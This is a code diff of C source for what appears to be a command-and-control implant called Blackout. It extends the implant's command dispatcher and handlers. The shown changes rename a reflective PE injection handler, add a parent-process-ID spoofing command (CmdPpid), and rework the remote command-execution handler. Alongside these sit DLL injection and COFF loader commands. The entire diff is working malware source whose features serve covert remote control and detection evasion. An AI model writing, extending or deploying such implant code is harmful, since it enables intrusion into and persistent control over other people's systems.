@@ -17,7 +17,8 @@ FUNC VOID CommandDispatcher(
     Instance()->Commands[ 8  ] = { .ID = COMMAND_PROCLIST, .Function = CmdProcEnum };
     Instance()->Commands[ 9  ] = { .ID = CMD_COFFLOADER,   .Function = CmdCoffLoader };
     Instance()->Commands[ 10 ] = { .ID = CMD_DLLINJECTION, .Function = CmdDllInjection }; 
-    Instance()->Commands[ 11 ] = { .ID = CMD_REFLECTION,   .Function = CmdReflectiveInjection };
+    Instance()->Commands[ 11 ] = { .ID = CMD_REFLECTION,   .Function = CmdPeloader };
+    Instance()->Commands[ 12 ] = { .ID = COMMAND_PPID,     .Function = CmdPpid };
 
     PPACKAGE Package     = NULL;
     PARSER   Parser      = { 0 };
@@ -187,21 +188,28 @@ FUNC VOID CmdRun(
     HANDLE   ProcessHandle = NULL;
     HANDLE   ThreadHandle  = NULL;
     BOOL     bCheck        = FALSE;
-    
-    PSTR   Output  = Instance()->Win32.LocalAlloc( LPTR, 1025 );    
-    UINT32 OutSize = 0;
 
-    bCheck = bkProcessCreate( ProcCmd, FALSE, TRUE, CREATE_NO_WINDOW, &ProcessHandle, &ProcessId, &ThreadHandle, &ThreadId, Output, &OutSize );
-    if ( !bCheck )
-        return;
+    bCheck = bkProcessCreate( ProcCmd, FALSE, TRUE, CREATE_NO_WINDOW, &ProcessHandle, &ProcessId, &ThreadHandle, &ThreadId );
+    if ( !bCheck ) { PackageTransmitError( NtLastError() ); return; };
 
     PackageAddBool(  BK_PACKAGE, bCheck     );
     PackageAddInt32( BK_PACKAGE, ProcessId  );
     PackageAddInt32( BK_PACKAGE, ThreadId   );
-    PackageAddBytes( BK_PACKAGE, Output, OutSize );
     PackageTransmit( BK_PACKAGE, NULL, NULL );
+}
 
-    if ( Output ) Instance()->Win32.LocalFree( Output );
+FUNC VOID CmdPpid(
+    PPARSER Parser
+) {
+    BLACKOUT_INSTANCE
+
+    UINT32 Ppid = ParserGetInt32( Parser );
+    BK_PACKAGE  = PackageCreate( COMMAND_PPID );
+
+    Blackout().Fork.Ppid = Ppid;
+
+    PackageAddInt32( BK_PACKAGE, Blackout().Fork.Ppid );
+    PackageTransmit( BK_PACKAGE, NULL, NULL );
 }
 
 FUNC VOID CmdExplorer(
@@ -241,14 +249,14 @@ FUNC VOID CmdExplorer(
     }
 }
 
-FUNC VOID CmdReflectiveInjection(
+FUNC VOID CmdPeloader(
     PPARSER Parser
 ) {
     UINT32 PeSize  = 0;
     PBYTE  PeBytes = ParserGetBytes( Parser, &PeSize );
     PSTR   PeArgs  = ParserGetString( Parser, 0 );
 
-    InjectionReflective( NtCurrentProcess(), PeBytes, PeSize, PeArgs, TRUE );
+    InjectionReflective( NtCurrentProcess(), PeBytes, PeSize, PeArgs );
 }
 
 FUNC VOID CmdDllInjection(
